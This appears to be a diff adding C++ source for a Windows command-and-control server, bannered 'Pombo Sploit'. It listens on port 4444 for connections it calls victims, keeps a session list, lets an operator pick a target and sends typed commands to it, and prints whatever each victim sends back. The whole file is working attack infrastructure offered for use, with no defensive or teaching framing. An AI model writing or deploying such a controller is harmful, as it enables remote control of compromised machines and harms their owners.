@@ -1,0 +1,208 @@
+
+#include <iostream>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <vector>
+#include <thread>
+#include <string>
+#include <mutex>
+#include <map>
+
+#pragma comment(lib, "ws2_32.lib")
+
+// --- GLOBAL VARIABLES ---
+std::map<int, SOCKET> sessions; // Map of Session ID -> Socket
+std::mutex sessions_mutex;      // Mutex to protect the sessions map
+int next_session_id = 1;
+
+// --- FUNCTION TO HANDLE A SINGLE VICTIM ---
+void handle_victim(int session_id, SOCKET client_socket) {
+    char buffer[4096] = { 0 };
+    std::string victim_ip = "unknown";
+    sockaddr_in client_addr;
+    int addr_len = sizeof(client_addr);
+    
+    if (getpeername(client_socket, (sockaddr*)&client_addr, &addr_len) == 0) {
+        victim_ip = inet_ntoa(client_addr.sin_addr);
+    }
+
+    std::cout << "[+] New victim connected. Session ID: " << session_id << " (" << victim_ip << ")" << std::endl;
+
+    while (true) {
+        int bytes_received = recv(client_socket, buffer, sizeof(buffer), 0);
+        if (bytes_received <= 0) {
+            std::cout << "[-] Victim " << session_id << " (" << victim_ip << ") disconnected." << std::endl;
+            break;
+        }
+        // Only print if we actually received data to avoid empty lines
+        std::cout << "[Session " << session_id << "] > " << std::string(buffer, 0, bytes_received) << std::endl;
+    }
+
+    // Cleanup on disconnect
+    closesocket(client_socket);
+    std::lock_guard<std::mutex> lock(sessions_mutex);
+    sessions.erase(session_id);
+}
+
+// --- MAIN SERVER LOOP ---
+int main() {
+    // --- BANNER ---
+    // 9  = Blue
+    // 15 = Bright White
+    // 7  = Default (Gray)
+
+    // Set color to Blue
+    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 9); 
+
+    std::cout << R"(
+  _____                _           
+ |  __ \              | |          
+ | |__) |__  _ __ ___ | |__   ___  
+ |  ___/ _ \| '_ ` _ \| '_ \ / _ \ 
+ | |  | (_) | | | | | | |_) | (_) |
+ |_|   \___/|_| |_| |_|_.__/ \___/                                       
+                  )" << std::flush;
+
+    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 15);
+    std::cout << R"(
+   _____       _       _ _   
+  / ____|     | |     (_) |  
+ | (___  _ __ | | ___  _| |_ 
+  \___ \| '_ \| |/ _ \| | __|
+  ____) | |_) | | (_) | | |_ 
+ |_____/| .__/|_|\___/|_|\__|
+        | |                  
+        |_|                  )" << std::flush;
+
+    // Change color back to Blue for the closing bracket
+    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 9);
+    std::cout << " " << std::endl;
+
+    // Reset to normal gray
+    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 7);
+    std::cout << std::endl;
+
+    // 1. Initialize Winsock
+    WSADATA wsaData;
+    int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
+    if (iResult != 0) {
+        std::cerr << "[-] WSAStartup failed: " << iResult << std::endl;
+        std::cout << "Press Enter to exit...";
+        std::cin.get();
+        return 1;
+    }
+
+    // 2. Create Socket
+    SOCKET listener = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (listener == INVALID_SOCKET) {
+        std::cerr << "[-] Error creating socket: " << WSAGetLastError() << std::endl;
+        WSACleanup();
+        std::cout << "Press Enter to exit...";
+        std::cin.get();
+        return 1;
+    }
+
+    // 3. Bind to Port
+    sockaddr_in server_addr;
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(4444); // The port to listen on
+    server_addr.sin_addr.s_addr = INADDR_ANY;
+
+    if (bind(listener, (sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
+        std::cerr << "[-] Bind failed. Port 4444 might be in use." << std::endl;
+        std::cerr << "Error Code: " << WSAGetLastError() << std::endl;
+        closesocket(listener);
+        WSACleanup();
+        std::cout << "Press Enter to exit...";
+        std::cin.get();
+        return 1;
+    }
+
+    // 4. Listen
+    if (listen(listener, SOMAXCONN) == SOCKET_ERROR) {
+        std::cerr << "[-] Listen failed." << std::endl;
+        closesocket(listener);
+        WSACleanup();
+        std::cout << "Press Enter to exit...";
+        std::cin.get();
+        return 1;
+    }
+
+    std::cout << "[*] Custom C2 Server listening on port 4444..." << std::endl;
+    std::cout << "[*] Type 'list' to see sessions, 'target <id>' to select a session." << std::endl << std::endl;
+
+    // --- START OF THREAD AND LOOP LOGIC ---
+    
+    // Thread to accept new connections
+    std::thread([&]() {
+        std::cout << "[DEBUG] Waiting for a connection on port 4444..." << std::endl;
+        while (true) {
+            sockaddr_in client_addr;
+            int addr_len = sizeof(client_addr);
+
+            // accept() BLOCKS here until a victim connects
+            SOCKET client_socket = accept(listener, (sockaddr*)&client_addr, &addr_len);
+
+            if (client_socket == INVALID_SOCKET) {
+                std::cout << "[-] Accept failed with error: " << WSAGetLastError() << std::endl;
+                Sleep(1000);
+                continue;
+            }
+
+            // If we get here, a victim DID connect
+            std::lock_guard<std::mutex> lock(sessions_mutex);
+            int session_id = next_session_id++;
+            sessions[session_id] = client_socket;
+
+            // Launch the thread to handle this specific victim
+            std::thread(handle_victim, session_id, client_socket).detach();
+        }
+    }).detach();
+
+    // Main console loop for you to type commands
+    std::string command;
+    SOCKET active_target = INVALID_SOCKET;
+
+    while (true) {
+        std::cout << "C2> ";
+        std::getline(std::cin, command);
+
+        if (command == "list") {
+            std::cout << "--- Active Sessions ---" << std::endl;
+            std::lock_guard<std::mutex> lock(sessions_mutex);
+            if (sessions.empty()) {
+                std::cout << "No active sessions." << std::endl;
+            } else {
+                for (const auto& pair : sessions) {
+                    std::cout << "Session ID: " << pair.first << std::endl;
+                }
+            }
+            std::cout << "----------------------" << std::endl;
+        }
+        else if (command.rfind("target ", 0) == 0) {
+            try {
+                int id = std::stoi(command.substr(7));
+                std::lock_guard<std::mutex> lock(sessions_mutex);
+                if (sessions.count(id)) {
+                    active_target = sessions[id];
+                    std::cout << "[*] Targeting Session ID: " << id << std::endl;
+                } else {
+                    std::cout << "[-] Invalid session ID." << std::endl;
+                }
+            } catch (...) {
+                std::cout << "[-] Usage: target <id>" << std::endl;
+            }
+        }
+        else if (!command.empty() && active_target != INVALID_SOCKET) {
+            send(active_target, command.c_str(), command.length(), 0);
+        }
+        else if (active_target == INVALID_SOCKET) {
+            std::cout << "[-] No target selected. Use 'target <id>' first." << std::endl;
+        }
+    }
+
+    // Cleanup at the very end (this line is technically unreachable in this infinite loop example)
+    closesocket(listener);
+    WSACleanup();
+    return 0;
+}
